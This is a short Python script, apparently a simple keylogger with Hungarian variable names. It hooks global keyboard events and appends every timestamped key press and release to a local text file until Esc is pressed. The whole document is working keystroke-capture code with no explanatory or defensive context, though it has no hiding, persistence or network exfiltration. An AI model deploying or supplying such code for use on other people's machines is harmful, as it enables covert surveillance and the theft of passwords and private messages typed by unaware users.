import keyboard
import os
import datetime

hely = os.path.join(os.path.dirname(__file__), 'billentyu.txt')

def log_keystroke(key, is_press):
    idopont = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    action = "press" if is_press else "release"
    log = f"{idopont} - {action}: {key}"
    with open(hely, "a") as f:
        f.write(log + "\n")

keyboard.on_press(lambda key: log_keystroke(key.name, True))
keyboard.on_release(lambda key: log_keystroke(key.name, False))

keyboard.wait("esc")